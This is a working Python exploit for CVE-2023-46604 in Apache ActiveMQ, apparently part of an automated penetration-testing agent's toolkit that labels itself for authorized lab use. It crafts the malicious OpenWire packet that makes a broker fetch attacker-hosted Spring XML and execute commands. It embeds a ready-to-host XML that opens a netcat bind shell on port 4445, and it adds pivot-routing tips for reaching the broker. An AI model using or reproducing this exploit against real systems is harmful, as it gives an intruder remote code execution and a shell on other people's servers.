#!/usr/bin/env python3
# yhwach-action: activemq_openwire_rce
# yhwach-inputs: target, port, xml_url
# yhwach-outputs: raw
# authorized_only: true
"""CVE-2023-46604 — Apache ActiveMQ OpenWire deserialization RCE.

Self-learned from Iron Crown (Challenge Lab 3): BROKER01 ran ActiveMQ 5.17.4 on
OpenWire :61616. Vulnerable: <5.15.16 / 5.16.7 / 5.17.6 / 5.18.3.

Mechanism: the OpenWire unmarshaller instantiates an arbitrary class with a single
String arg. We use `org.springframework.context.support.ClassPathXmlApplicationContext`
pointed at an XML URL we control; the Spring XML builds a `java.lang.ProcessBuilder`
and calls `start()`, giving command execution as the broker user.

OPSEC / routing note (the part that bites you): the broker must be able to REACH
`xml_url`. When the broker sits behind a pivot (e.g. Ligolo, outbound-only from your
box), host the XML on the PIVOT host that shares the broker's subnet — not on your
attack box — and use a bind shell in the XML so you connect *in* through the tunnel.

Usage:
    activemq_openwire_rce.py <target> <port> <xml_url>

Example (XML hosted on the pivot at 172.16.239.13):
    activemq_openwire_rce.py 172.16.239.31 61616 http://172.16.239.13:8888/poc.xml

A ready-to-host Spring XML that opens a bind shell on :4445 (connect through the
pivot afterwards) is printed by `--emit-xml`.

Authorized OSAI exam / authorized lab use only. See AUTHORIZATION.md.
"""
from __future__ import annotations

import socket
import struct
import sys

CLAZZ = b"org.springframework.context.support.ClassPathXmlApplicationContext"

BIND_SHELL_XML = """<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans
   http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value><![CDATA[rm -f /tmp/.bind; mkfifo /tmp/.bind; nc -l -p 4445 < /tmp/.bind | /bin/bash > /tmp/.bind 2>&1]]></value>
            </list>
        </constructor-arg>
    </bean>
</beans>
"""


def build_payload(xml_url: str) -> bytes:
    """Craft the OpenWire type-31 (ExceptionResponse) packet that triggers the RCE."""
    url = xml_url.encode()
    data = b""
    data += struct.pack("B", 31)          # ExceptionResponse data type
    data += struct.pack(">I", 0)          # command id
    data += struct.pack("B", 0)           # response required = false
    data += struct.pack(">I", 0)          # correlation id
    data += struct.pack("B", 1)           # unmarshal throwable: continue
    data += struct.pack("B", 1)           # string present -> class name
    data += struct.pack(">H", len(CLAZZ))
    data += CLAZZ
    data += struct.pack("B", 1)           # string present -> ctor arg (URL)
    data += struct.pack(">H", len(url))
    data += url
    return struct.pack(">I", len(data)) + data


def exploit(target: str, port: int, xml_url: str) -> bool:
    print(f"[*] Connecting to {target}:{port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((target, port))
        banner = s.recv(4096)
        print(f"[*] Received {len(banner)} bytes banner")
        if b"ActiveMQ" not in banner:
            print("[-] Not an ActiveMQ OpenWire service (no ActiveMQ magic in banner)")
            return False
        print(f"[*] Sending exploit payload -> {xml_url}")
        s.send(build_payload(xml_url))
        print("[+] Payload sent. The broker should now fetch and execute the XML.")
        return True
    except OSError as e:
        print(f"[-] Error: {e}")
        return False
    finally:
        s.close()


def main(argv: list[str]) -> int:
    if len(argv) == 2 and argv[1] == "--emit-xml":
        sys.stdout.write(BIND_SHELL_XML)
        return 0
    if len(argv) != 4:
        sys.stderr.write(
            "Usage: activemq_openwire_rce.py <target> <port> <xml_url>\n"
            "       activemq_openwire_rce.py --emit-xml   # print a bind-shell Spring XML\n"
        )
        return 2
    ok = exploit(argv[1], int(argv[2]), argv[3])
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
